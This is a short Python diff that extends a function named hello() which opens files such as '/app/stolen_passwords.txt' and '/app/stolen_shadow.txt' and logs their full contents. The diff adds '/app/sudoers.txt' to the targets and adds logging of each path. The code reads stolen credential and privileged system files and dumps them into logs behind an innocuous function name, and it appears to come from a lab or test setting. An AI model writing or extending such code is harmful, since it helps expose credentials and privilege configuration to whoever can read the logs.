@@ -14,12 +14,14 @@ def hello():
     target_files = [
         '/app/stolen_passwords.txt',
         '/app/stolen_shadow.txt',
+        '/app/sudoers.txt',
     ]
     
     for file_path in target_files:
         try:
             if os.path.exists(file_path):
                 with open(file_path, 'r') as f:
+                    logger.info(f"Read file: {file_path}")
                     logger.info(f.read())
             else:
                 logger.info("File not found or access denied")
